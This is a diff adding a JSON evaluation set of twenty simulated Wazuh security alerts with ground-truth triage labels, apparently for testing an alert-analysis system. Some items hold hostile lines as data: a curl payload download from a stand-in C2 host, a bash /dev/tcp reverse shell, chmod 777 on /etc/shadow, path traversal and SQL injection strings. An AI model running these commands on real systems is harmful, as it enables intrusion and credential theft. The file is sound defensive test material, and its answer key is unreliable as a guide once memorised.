@@ -1,0 +1,442 @@
+[
+  {
+    "id": "eval-001",
+    "category": "ssh_brute_force",
+    "wazuh_alert": {
+      "id": "eval-001", "timestamp": "2026-04-06T14:22:01.000+0000",
+      "rule": {"id": "5710", "level": 5, "description": "sshd: Attempt to login using a denied user.", "groups": ["syslog", "sshd", "authentication_failed"], "mitre": {"id": ["T1110"], "tactic": ["Credential Access"]}},
+      "agent": {"id": "001", "name": "target-1-compute", "ip": "10.128.0.35"},
+      "data": {"srcip": "203.0.113.42", "srcport": "44231", "dstuser": "root"},
+      "location": "/var/log/auth.log",
+      "full_log": "Apr  6 14:22:01 target-1 sshd[12345]: Failed password for invalid user root from 203.0.113.42 port 44231 ssh2"
+    },
+    "ground_truth": {
+      "is_true_positive": true, "expected_severity": "low", "expected_response": "investigate",
+      "expected_key_indicators": ["source IP 203.0.113.42", "target user root", "failed password"],
+      "expected_mitre_tactic": "Credential Access", "notes": "Single failed SSH login, not yet brute-force"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "512", "name": "sshd", "path": "/usr/sbin/sshd", "cmdline": "/usr/sbin/sshd -D", "uid": "0", "start_time": "1712300010"}],
+      "logged_in_users": [{"user": "root", "host": "10.128.0.29", "time": "1712430000", "tty": "pts/0", "type": "user"}],
+      "open_connections": [{"pid": "512", "local_address": "0.0.0.0", "local_port": "22", "remote_address": "203.0.113.42", "remote_port": "44231", "state": "ESTABLISHED", "protocol": "6"}]
+    }
+  },
+  {
+    "id": "eval-002",
+    "category": "ssh_brute_force",
+    "wazuh_alert": {
+      "id": "eval-002", "timestamp": "2026-04-06T14:25:33.000+0000",
+      "rule": {"id": "5712", "level": 10, "description": "sshd: brute force trying to get access to the system.", "groups": ["syslog", "sshd", "authentication_failures"], "mitre": {"id": ["T1110.001"], "tactic": ["Credential Access"]}},
+      "agent": {"id": "001", "name": "target-1-compute", "ip": "10.128.0.35"},
+      "data": {"srcip": "203.0.113.42", "srcport": "44298", "dstuser": "admin"},
+      "location": "/var/log/auth.log",
+      "full_log": "Apr  6 14:25:33 target-1 sshd[12389]: Failed password for invalid user admin from 203.0.113.42 port 44298 ssh2"
+    },
+    "ground_truth": {
+      "is_true_positive": true, "expected_severity": "high", "expected_response": "contain",
+      "expected_key_indicators": ["brute force", "203.0.113.42", "multiple failed attempts"],
+      "expected_mitre_tactic": "Credential Access", "notes": "Active brute-force from same IP"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "512", "name": "sshd", "path": "/usr/sbin/sshd", "cmdline": "/usr/sbin/sshd -D", "uid": "0", "start_time": "1712300010"}],
+      "logged_in_users": [{"user": "root", "host": "10.128.0.29", "time": "1712430000", "tty": "pts/0", "type": "user"}],
+      "open_connections": [{"pid": "512", "local_address": "0.0.0.0", "local_port": "22", "remote_address": "203.0.113.42", "remote_port": "44298", "state": "ESTABLISHED", "protocol": "6"}]
+    }
+  },
+  {
+    "id": "eval-003",
+    "category": "ssh_success_after_failures",
+    "wazuh_alert": {
+      "id": "eval-003", "timestamp": "2026-04-06T19:05:22.000+0000",
+      "rule": {"id": "5715", "level": 6, "description": "sshd: authentication success after several failed attempts.", "groups": ["syslog", "sshd", "authentication_success"], "mitre": {"id": ["T1110"], "tactic": ["Credential Access"]}},
+      "agent": {"id": "002", "name": "target-2-compute", "ip": "10.128.0.14"},
+      "data": {"srcip": "203.0.113.42", "srcport": "55012", "dstuser": "webadmin"},
+      "location": "/var/log/auth.log",
+      "full_log": "Apr  6 19:05:22 target-2 sshd[13001]: Accepted password for webadmin from 203.0.113.42 port 55012 ssh2"
+    },
+    "ground_truth": {
+      "is_true_positive": true, "expected_severity": "high", "expected_response": "contain",
+      "expected_key_indicators": ["success after failures", "203.0.113.42", "webadmin"],
+      "expected_mitre_tactic": "Credential Access", "notes": "Successful login from attacker IP after brute-force"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "512", "name": "sshd", "path": "/usr/sbin/sshd", "cmdline": "/usr/sbin/sshd -D", "uid": "0", "start_time": "1712300010"}, {"pid": "13001", "name": "bash", "path": "/bin/bash", "cmdline": "-bash", "uid": "1001", "start_time": "1712435122"}],
+      "logged_in_users": [{"user": "webadmin", "host": "203.0.113.42", "time": "1712435122", "tty": "pts/2", "type": "user"}],
+      "open_connections": [{"pid": "13001", "local_address": "10.128.0.14", "local_port": "22", "remote_address": "203.0.113.42", "remote_port": "55012", "state": "ESTABLISHED", "protocol": "6"}]
+    }
+  },
+  {
+    "id": "eval-004",
+    "category": "file_integrity",
+    "wazuh_alert": {
+      "id": "eval-004", "timestamp": "2026-04-06T15:01:17.000+0000",
+      "rule": {"id": "550", "level": 7, "description": "Integrity checksum changed.", "groups": ["ossec", "syscheck", "syscheck_entry_modified"], "mitre": {"id": ["T1565.001"], "tactic": ["Impact"]}},
+      "agent": {"id": "002", "name": "target-2-compute", "ip": "10.128.0.14"},
+      "data": {"path": "/etc/passwd", "mode": "realtime", "changed_attributes": ["content", "mtime"]},
+      "location": "syscheck",
+      "full_log": "File '/etc/passwd' modified. MD5 changed from a1b2c3d4e5f6 to f6e5d4c3b2a1"
+    },
+    "ground_truth": {
+      "is_true_positive": true, "expected_severity": "high", "expected_response": "investigate",
+      "expected_key_indicators": ["/etc/passwd", "content changed", "integrity"],
+      "expected_mitre_tactic": "Impact", "notes": "Critical system file modification"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "2050", "name": "useradd", "path": "/usr/sbin/useradd", "cmdline": "useradd backdoor", "uid": "0", "start_time": "1712435275"}],
+      "file_events": [{"target_path": "/etc/passwd", "action": "UPDATED", "time": "1712435277", "category": "config"}],
+      "crontabs": [{"command": "/usr/bin/logrotate /etc/logrotate.conf", "path": "/etc/crontab", "minute": "0", "hour": "3"}]
+    }
+  },
+  {
+    "id": "eval-005",
+    "category": "file_integrity",
+    "wazuh_alert": {
+      "id": "eval-005", "timestamp": "2026-04-06T15:10:45.000+0000",
+      "rule": {"id": "554", "level": 7, "description": "File added to the system.", "groups": ["ossec", "syscheck", "syscheck_entry_added"], "mitre": {"id": ["T1105"], "tactic": ["Command and Control"]}},
+      "agent": {"id": "001", "name": "target-1-compute", "ip": "10.128.0.35"},
+      "data": {"path": "/tmp/.hidden/backdoor.sh", "mode": "realtime"},
+      "location": "syscheck",
+      "full_log": "New file '/tmp/.hidden/backdoor.sh' added to the system."
+    },
+    "ground_truth": {
+      "is_true_positive": true, "expected_severity": "high", "expected_response": "contain",
+      "expected_key_indicators": ["/tmp/.hidden/", "backdoor.sh", "new file"],
+      "expected_mitre_tactic": "Command and Control", "notes": "Suspicious hidden file dropped"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "2048", "name": "curl", "path": "/usr/bin/curl", "cmdline": "curl http://malicious-c2.example.com/payload.sh -o /tmp/.hidden/backdoor.sh", "uid": "1000", "start_time": "1712435700"}],
+      "file_events": [{"target_path": "/tmp/.hidden/backdoor.sh", "action": "CREATED", "time": "1712435845", "category": "tmp"}],
+      "crontabs": [{"command": "/tmp/.hidden/update.sh", "path": "/var/spool/cron/crontabs/root", "minute": "*/5", "hour": "*"}]
+    }
+  },
+  {
+    "id": "eval-006",
+    "category": "privilege_escalation",
+    "wazuh_alert": {
+      "id": "eval-006", "timestamp": "2026-04-06T16:45:02.000+0000",
+      "rule": {"id": "5402", "level": 3, "description": "Successful sudo to ROOT executed.", "groups": ["syslog", "sudo"], "mitre": {"id": ["T1548.003"], "tactic": ["Privilege Escalation"]}},
+      "agent": {"id": "001", "name": "target-1-compute", "ip": "10.128.0.35"},
+      "data": {"srcuser": "developer", "dstuser": "root", "command": "/bin/bash"},
+      "location": "/var/log/auth.log",
+      "full_log": "Apr  6 16:45:02 target-1 sudo: developer : TTY=pts/0 ; PWD=/home/developer ; USER=root ; COMMAND=/bin/bash"
+    },
+    "ground_truth": {
+      "is_true_positive": false, "expected_severity": "low", "expected_response": "monitor",
+      "expected_key_indicators": ["sudo to root", "developer", "/bin/bash"],
+      "expected_mitre_tactic": "Privilege Escalation", "notes": "Routine admin sudo, likely benign"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "3100", "name": "bash", "path": "/bin/bash", "cmdline": "-bash", "uid": "0", "start_time": "1712436302"}],
+      "logged_in_users": [{"user": "developer", "host": "10.128.0.29", "time": "1712434000", "tty": "pts/0", "type": "user"}],
+      "open_connections": []
+    }
+  },
+  {
+    "id": "eval-007",
+    "category": "privilege_escalation",
+    "wazuh_alert": {
+      "id": "eval-007", "timestamp": "2026-04-06T17:30:15.000+0000",
+      "rule": {"id": "5403", "level": 4, "description": "First time user executed sudo.", "groups": ["syslog", "sudo"], "mitre": {"id": ["T1548.003"], "tactic": ["Privilege Escalation"]}},
+      "agent": {"id": "002", "name": "target-2-compute", "ip": "10.128.0.14"},
+      "data": {"srcuser": "webadmin", "dstuser": "root", "command": "/usr/bin/chmod 777 /etc/shadow"},
+      "location": "/var/log/auth.log",
+      "full_log": "Apr  6 17:30:15 target-2 sudo: webadmin : TTY=pts/2 ; USER=root ; COMMAND=/usr/bin/chmod 777 /etc/shadow"
+    },
+    "ground_truth": {
+      "is_true_positive": true, "expected_severity": "critical", "expected_response": "escalate",
+      "expected_key_indicators": ["first time sudo", "chmod 777 /etc/shadow", "webadmin"],
+      "expected_mitre_tactic": "Privilege Escalation", "notes": "Dangerous privilege escalation on sensitive file"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "3200", "name": "chmod", "path": "/usr/bin/chmod", "cmdline": "chmod 777 /etc/shadow", "uid": "0", "start_time": "1712437815"}],
+      "logged_in_users": [{"user": "webadmin", "host": "203.0.113.42", "time": "1712435122", "tty": "pts/2", "type": "user"}],
+      "open_connections": [{"pid": "3200", "local_address": "10.128.0.14", "local_port": "22", "remote_address": "203.0.113.42", "remote_port": "55012", "state": "ESTABLISHED", "protocol": "6"}]
+    }
+  },
+  {
+    "id": "eval-008",
+    "category": "web_attack",
+    "wazuh_alert": {
+      "id": "eval-008", "timestamp": "2026-04-06T17:12:45.000+0000",
+      "rule": {"id": "31104", "level": 6, "description": "Web server 400 error code.", "groups": ["web", "accesslog", "web_scan"], "mitre": {"id": ["T1190"], "tactic": ["Initial Access"]}},
+      "agent": {"id": "002", "name": "target-2-compute", "ip": "10.128.0.14"},
+      "data": {"srcip": "198.51.100.77", "url": "/admin/../../etc/passwd", "httpmethod": "GET", "response_code": "400"},
+      "location": "/var/log/nginx/access.log",
+      "full_log": "198.51.100.77 - - [06/Apr/2026:17:12:45 +0000] \"GET /admin/../../etc/passwd HTTP/1.1\" 400 150"
+    },
+    "ground_truth": {
+      "is_true_positive": true, "expected_severity": "medium", "expected_response": "investigate",
+      "expected_key_indicators": ["path traversal", "../../etc/passwd", "198.51.100.77"],
+      "expected_mitre_tactic": "Initial Access", "notes": "Path traversal attempt, blocked by server"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "1024", "name": "nginx", "path": "/usr/sbin/nginx", "cmdline": "nginx: master process", "uid": "0", "start_time": "1712300020"}],
+      "open_connections": [{"pid": "1024", "local_address": "0.0.0.0", "local_port": "80", "remote_address": "198.51.100.77", "remote_port": "54321", "state": "ESTABLISHED", "protocol": "6"}],
+      "listening_ports": [{"pid": "1024", "port": "80", "protocol": "6", "address": "0.0.0.0"}, {"pid": "1024", "port": "443", "protocol": "6", "address": "0.0.0.0"}]
+    }
+  },
+  {
+    "id": "eval-009",
+    "category": "web_attack",
+    "wazuh_alert": {
+      "id": "eval-009", "timestamp": "2026-04-06T17:13:02.000+0000",
+      "rule": {"id": "31105", "level": 6, "description": "Web server 403 error code.", "groups": ["web", "accesslog", "web_scan"], "mitre": {"id": ["T1190"], "tactic": ["Initial Access"]}},
+      "agent": {"id": "002", "name": "target-2-compute", "ip": "10.128.0.14"},
+      "data": {"srcip": "198.51.100.77", "url": "/wp-admin/setup-config.php", "httpmethod": "GET", "response_code": "403"},
+      "location": "/var/log/nginx/access.log",
+      "full_log": "198.51.100.77 - - [06/Apr/2026:17:13:02 +0000] \"GET /wp-admin/setup-config.php HTTP/1.1\" 403 162"
+    },
+    "ground_truth": {
+      "is_true_positive": true, "expected_severity": "low", "expected_response": "monitor",
+      "expected_key_indicators": ["wp-admin", "scan", "198.51.100.77"],
+      "expected_mitre_tactic": "Initial Access", "notes": "Automated scanner probing for WordPress"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "1024", "name": "nginx", "path": "/usr/sbin/nginx", "cmdline": "nginx: master process", "uid": "0", "start_time": "1712300020"}],
+      "open_connections": [{"pid": "1024", "local_address": "0.0.0.0", "local_port": "80", "remote_address": "198.51.100.77", "remote_port": "54322", "state": "ESTABLISHED", "protocol": "6"}],
+      "listening_ports": [{"pid": "1024", "port": "80", "protocol": "6", "address": "0.0.0.0"}]
+    }
+  },
+  {
+    "id": "eval-010",
+    "category": "rootkit",
+    "wazuh_alert": {
+      "id": "eval-010", "timestamp": "2026-04-06T18:30:11.000+0000",
+      "rule": {"id": "510", "level": 7, "description": "Host-based anomaly detection event (rootcheck).", "groups": ["ossec", "rootcheck"], "mitre": {"id": ["T1014"], "tactic": ["Defense Evasion"]}},
+      "agent": {"id": "001", "name": "target-1-compute", "ip": "10.128.0.35"},
+      "data": {"title": "Trojaned version of file detected.", "file": "/usr/bin/ls"},
+      "location": "rootcheck",
+      "full_log": "Trojaned version of file '/usr/bin/ls' detected. Possible rootkit activity."
+    },
+    "ground_truth": {
+      "is_true_positive": true, "expected_severity": "critical", "expected_response": "escalate",
+      "expected_key_indicators": ["trojaned", "/usr/bin/ls", "rootkit"],
+      "expected_mitre_tactic": "Defense Evasion", "notes": "Strong rootkit indicator"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "1", "name": "systemd", "path": "/usr/lib/systemd/systemd", "cmdline": "/sbin/init", "uid": "0", "start_time": "1712300000"}],
+      "suid_binaries": [{"path": "/usr/bin/ls", "username": "root", "permissions": "4755", "directory": "/usr/bin"}, {"path": "/usr/bin/sudo", "username": "root", "permissions": "4755", "directory": "/usr/bin"}],
+      "crontabs": [{"command": "/tmp/.hidden/update.sh", "path": "/var/spool/cron/crontabs/root", "minute": "*/5", "hour": "*"}]
+    }
+  },
+  {
+    "id": "eval-011",
+    "category": "audit_command",
+    "wazuh_alert": {
+      "id": "eval-011", "timestamp": "2026-04-06T20:15:00.000+0000",
+      "rule": {"id": "80790", "level": 3, "description": "Audit: Command executed.", "groups": ["audit", "audit_command"], "mitre": {"id": ["T1059"], "tactic": ["Execution"]}},
+      "agent": {"id": "001", "name": "target-1-compute", "ip": "10.128.0.35"},
+      "data": {"audit": {"exe": "/usr/bin/curl", "command": "curl", "args": "http://malicious-c2.example.com/payload.sh", "success": "yes", "uid": "1000", "euid": "0"}},
+      "location": "audit",
+      "full_log": "type=EXECVE msg=audit(1712435700.000:1234): argc=2 a0=\"curl\" a1=\"http://malicious-c2.example.com/payload.sh\""
+    },
+    "ground_truth": {
+      "is_true_positive": true, "expected_severity": "high", "expected_response": "contain",
+      "expected_key_indicators": ["curl", "malicious-c2.example.com", "euid=0"],
+      "expected_mitre_tactic": "Execution", "notes": "Downloading payload with elevated privileges"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "2048", "name": "curl", "path": "/usr/bin/curl", "cmdline": "curl http://malicious-c2.example.com/payload.sh", "uid": "1000", "start_time": "1712435700"}],
+      "open_connections": [{"pid": "2048", "local_address": "10.128.0.35", "local_port": "48210", "remote_address": "93.184.216.34", "remote_port": "80", "state": "ESTABLISHED", "protocol": "6"}],
+      "logged_in_users": [{"user": "developer", "host": "10.128.0.29", "time": "1712434000", "tty": "pts/0", "type": "user"}]
+    }
+  },
+  {
+    "id": "eval-012",
+    "category": "benign",
+    "wazuh_alert": {
+      "id": "eval-012", "timestamp": "2026-04-06T03:00:01.000+0000",
+      "rule": {"id": "502", "level": 3, "description": "Ossec server started.", "groups": ["ossec", "service_start"], "mitre": {}},
+      "agent": {"id": "001", "name": "target-1-compute", "ip": "10.128.0.35"},
+      "data": {},
+      "location": "ossec-monitord",
+      "full_log": "ossec-monitord: Manager started."
+    },
+    "ground_truth": {
+      "is_true_positive": false, "expected_severity": "info", "expected_response": "ignore",
+      "expected_key_indicators": ["service started", "ossec-monitord"],
+      "expected_mitre_tactic": "", "notes": "Normal service startup"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "1", "name": "systemd", "path": "/usr/lib/systemd/systemd", "cmdline": "/sbin/init", "uid": "0", "start_time": "1712300000"}],
+      "open_connections": [],
+      "logged_in_users": []
+    }
+  },
+  {
+    "id": "eval-013",
+    "category": "benign",
+    "wazuh_alert": {
+      "id": "eval-013", "timestamp": "2026-04-06T06:25:00.000+0000",
+      "rule": {"id": "5501", "level": 3, "description": "Login session opened.", "groups": ["syslog", "pam", "authentication_success"], "mitre": {}},
+      "agent": {"id": "001", "name": "target-1-compute", "ip": "10.128.0.35"},
+      "data": {"srcuser": "root", "dstuser": "root", "uid": "0"},
+      "location": "/var/log/auth.log",
+      "full_log": "Apr  6 06:25:00 target-1 CRON[1234]: pam_unix(cron:session): session opened for user root by (uid=0)"
+    },
+    "ground_truth": {
+      "is_true_positive": false, "expected_severity": "info", "expected_response": "ignore",
+      "expected_key_indicators": ["cron session", "root", "routine"],
+      "expected_mitre_tactic": "", "notes": "Cron job session — routine system activity"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "1234", "name": "cron", "path": "/usr/sbin/cron", "cmdline": "/usr/sbin/cron -f", "uid": "0", "start_time": "1712300000"}],
+      "logged_in_users": [],
+      "open_connections": []
+    }
+  },
+  {
+    "id": "eval-014",
+    "category": "benign",
+    "wazuh_alert": {
+      "id": "eval-014", "timestamp": "2026-04-06T03:00:05.000+0000",
+      "rule": {"id": "591", "level": 3, "description": "Log file rotated.", "groups": ["ossec", "syscheck"], "mitre": {}},
+      "agent": {"id": "002", "name": "target-2-compute", "ip": "10.128.0.14"},
+      "data": {"path": "/var/log/syslog.1"},
+      "location": "syscheck",
+      "full_log": "Log file rotated: /var/log/syslog.1"
+    },
+    "ground_truth": {
+      "is_true_positive": false, "expected_severity": "info", "expected_response": "ignore",
+      "expected_key_indicators": ["log rotation", "syslog.1"],
+      "expected_mitre_tactic": "", "notes": "Routine log rotation"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "800", "name": "logrotate", "path": "/usr/sbin/logrotate", "cmdline": "/usr/sbin/logrotate /etc/logrotate.conf", "uid": "0", "start_time": "1712300005"}],
+      "file_events": [{"target_path": "/var/log/syslog.1", "action": "CREATED", "time": "1712300005", "category": "log"}],
+      "crontabs": [{"command": "/usr/sbin/logrotate /etc/logrotate.conf", "path": "/etc/crontab", "minute": "0", "hour": "3"}]
+    }
+  },
+  {
+    "id": "eval-015",
+    "category": "malware_c2",
+    "wazuh_alert": {
+      "id": "eval-015", "timestamp": "2026-04-06T21:00:30.000+0000",
+      "rule": {"id": "80791", "level": 12, "description": "Audit: Suspicious process execution detected.", "groups": ["audit", "audit_command"], "mitre": {"id": ["T1059.004"], "tactic": ["Execution"]}},
+      "agent": {"id": "001", "name": "target-1-compute", "ip": "10.128.0.35"},
+      "data": {"audit": {"exe": "/bin/bash", "command": "bash", "args": "-i >& /dev/tcp/203.0.113.42/4444 0>&1", "success": "yes", "uid": "1000", "euid": "1000"}},
+      "location": "audit",
+      "full_log": "type=EXECVE msg=audit(1712438430.000:1235): argc=3 a0=\"bash\" a1=\"-i\" a2=\">& /dev/tcp/203.0.113.42/4444 0>&1\""
+    },
+    "ground_truth": {
+      "is_true_positive": true, "expected_severity": "critical", "expected_response": "escalate",
+      "expected_key_indicators": ["reverse shell", "/dev/tcp/", "203.0.113.42:4444"],
+      "expected_mitre_tactic": "Execution", "notes": "Active reverse shell to attacker IP"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "4001", "name": "bash", "path": "/bin/bash", "cmdline": "bash -i >& /dev/tcp/203.0.113.42/4444 0>&1", "uid": "1000", "start_time": "1712438430"}],
+      "open_connections": [{"pid": "4001", "local_address": "10.128.0.35", "local_port": "39001", "remote_address": "203.0.113.42", "remote_port": "4444", "state": "ESTABLISHED", "protocol": "6"}],
+      "logged_in_users": [{"user": "developer", "host": "10.128.0.29", "time": "1712434000", "tty": "pts/0", "type": "user"}]
+    }
+  },
+  {
+    "id": "eval-016",
+    "category": "web_attack",
+    "wazuh_alert": {
+      "id": "eval-016", "timestamp": "2026-04-06T17:15:10.000+0000",
+      "rule": {"id": "31106", "level": 12, "description": "SQL injection attempt.", "groups": ["web", "accesslog", "attack"], "mitre": {"id": ["T1190"], "tactic": ["Initial Access"]}},
+      "agent": {"id": "002", "name": "target-2-compute", "ip": "10.128.0.14"},
+      "data": {"srcip": "198.51.100.77", "url": "/api/users?id=1' OR '1'='1", "httpmethod": "GET", "response_code": "500"},
+      "location": "/var/log/nginx/access.log",
+      "full_log": "198.51.100.77 - - [06/Apr/2026:17:15:10 +0000] \"GET /api/users?id=1' OR '1'='1 HTTP/1.1\" 500 0"
+    },
+    "ground_truth": {
+      "is_true_positive": true, "expected_severity": "high", "expected_response": "contain",
+      "expected_key_indicators": ["SQL injection", "OR '1'='1", "500 error"],
+      "expected_mitre_tactic": "Initial Access", "notes": "SQL injection causing server error"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "1024", "name": "nginx", "path": "/usr/sbin/nginx", "cmdline": "nginx: master process", "uid": "0", "start_time": "1712300020"}],
+      "open_connections": [{"pid": "1024", "local_address": "0.0.0.0", "local_port": "80", "remote_address": "198.51.100.77", "remote_port": "54400", "state": "ESTABLISHED", "protocol": "6"}],
+      "listening_ports": [{"pid": "1024", "port": "80", "protocol": "6", "address": "0.0.0.0"}]
+    }
+  },
+  {
+    "id": "eval-017",
+    "category": "file_integrity",
+    "wazuh_alert": {
+      "id": "eval-017", "timestamp": "2026-04-06T22:10:00.000+0000",
+      "rule": {"id": "550", "level": 7, "description": "Integrity checksum changed.", "groups": ["ossec", "syscheck", "syscheck_entry_modified"], "mitre": {"id": ["T1222"], "tactic": ["Defense Evasion"]}},
+      "agent": {"id": "001", "name": "target-1-compute", "ip": "10.128.0.35"},
+      "data": {"path": "/usr/bin/ls", "mode": "realtime", "changed_attributes": ["content", "inode", "md5"]},
+      "location": "syscheck",
+      "full_log": "File '/usr/bin/ls' modified. Possible binary replacement."
+    },
+    "ground_truth": {
+      "is_true_positive": true, "expected_severity": "critical", "expected_response": "escalate",
+      "expected_key_indicators": ["/usr/bin/ls", "binary modified", "inode changed"],
+      "expected_mitre_tactic": "Defense Evasion", "notes": "System binary replacement — rootkit confirmation"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "1", "name": "systemd", "path": "/usr/lib/systemd/systemd", "cmdline": "/sbin/init", "uid": "0", "start_time": "1712300000"}],
+      "suid_binaries": [{"path": "/usr/bin/ls", "username": "root", "permissions": "4755", "directory": "/usr/bin"}],
+      "file_events": [{"target_path": "/usr/bin/ls", "action": "UPDATED", "time": "1712441400", "category": "bin"}]
+    }
+  },
+  {
+    "id": "eval-018",
+    "category": "benign",
+    "wazuh_alert": {
+      "id": "eval-018", "timestamp": "2026-04-06T12:00:00.000+0000",
+      "rule": {"id": "5501", "level": 3, "description": "Login session opened.", "groups": ["syslog", "pam", "authentication_success"], "mitre": {}},
+      "agent": {"id": "001", "name": "target-1-compute", "ip": "10.128.0.35"},
+      "data": {"srcuser": "developer", "dstuser": "developer", "uid": "1000"},
+      "location": "/var/log/auth.log",
+      "full_log": "Apr  6 12:00:00 target-1 sshd[10001]: pam_unix(sshd:session): session opened for user developer by (uid=0)"
+    },
+    "ground_truth": {
+      "is_true_positive": false, "expected_severity": "info", "expected_response": "ignore",
+      "expected_key_indicators": ["SSH session opened", "developer", "normal login"],
+      "expected_mitre_tactic": "", "notes": "Normal developer SSH login"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "10001", "name": "sshd", "path": "/usr/sbin/sshd", "cmdline": "sshd: developer [priv]", "uid": "0", "start_time": "1712404800"}],
+      "logged_in_users": [{"user": "developer", "host": "10.128.0.29", "time": "1712404800", "tty": "pts/0", "type": "user"}],
+      "open_connections": []
+    }
+  },
+  {
+    "id": "eval-019",
+    "category": "privilege_escalation",
+    "wazuh_alert": {
+      "id": "eval-019", "timestamp": "2026-04-06T21:30:00.000+0000",
+      "rule": {"id": "5404", "level": 8, "description": "Unauthorized sudo attempt (user not in sudoers).", "groups": ["syslog", "sudo", "authentication_failed"], "mitre": {"id": ["T1548.003"], "tactic": ["Privilege Escalation"]}},
+      "agent": {"id": "002", "name": "target-2-compute", "ip": "10.128.0.14"},
+      "data": {"srcuser": "www-data", "dstuser": "root", "command": "/bin/bash"},
+      "location": "/var/log/auth.log",
+      "full_log": "Apr  6 21:30:00 target-2 sudo: www-data : user NOT in sudoers ; TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash"
+    },
+    "ground_truth": {
+      "is_true_positive": true, "expected_severity": "high", "expected_response": "contain",
+      "expected_key_indicators": ["not in sudoers", "www-data", "privilege escalation attempt"],
+      "expected_mitre_tactic": "Privilege Escalation", "notes": "Web service account trying to escalate"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "1025", "name": "nginx", "path": "/usr/sbin/nginx", "cmdline": "nginx: worker process", "uid": "33", "start_time": "1712300020"}, {"pid": "5001", "name": "bash", "path": "/bin/bash", "cmdline": "/bin/bash", "uid": "33", "start_time": "1712439000"}],
+      "logged_in_users": [{"user": "webadmin", "host": "203.0.113.42", "time": "1712435122", "tty": "pts/2", "type": "user"}],
+      "open_connections": [{"pid": "5001", "local_address": "10.128.0.14", "local_port": "22", "remote_address": "203.0.113.42", "remote_port": "55012", "state": "ESTABLISHED", "protocol": "6"}]
+    }
+  },
+  {
+    "id": "eval-020",
+    "category": "audit_command",
+    "wazuh_alert": {
+      "id": "eval-020", "timestamp": "2026-04-06T21:45:00.000+0000",
+      "rule": {"id": "80790", "level": 3, "description": "Audit: Command executed.", "groups": ["audit", "audit_command"], "mitre": {"id": ["T1053.003"], "tactic": ["Persistence"]}},
+      "agent": {"id": "001", "name": "target-1-compute", "ip": "10.128.0.35"},
+      "data": {"audit": {"exe": "/usr/bin/crontab", "command": "crontab", "args": "-e", "success": "yes", "uid": "0", "euid": "0"}},
+      "location": "audit",
+      "full_log": "type=EXECVE msg=audit(1712439900.000:1240): argc=2 a0=\"crontab\" a1=\"-e\""
+    },
+    "ground_truth": {
+      "is_true_positive": true, "expected_severity": "medium", "expected_response": "investigate",
+      "expected_key_indicators": ["crontab -e", "root", "persistence"],
+      "expected_mitre_tactic": "Persistence", "notes": "Root modifying crontab — check for persistence"
+    },
+    "simulated_enrichment": {
+      "running_processes": [{"pid": "5100", "name": "crontab", "path": "/usr/bin/crontab", "cmdline": "crontab -e", "uid": "0", "start_time": "1712439900"}],
+      "open_connections": [],
+      "logged_in_users": [{"user": "root", "host": "10.128.0.29", "time": "1712430000", "tty": "pts/0", "type": "user"}]
+    }
+  }
+]
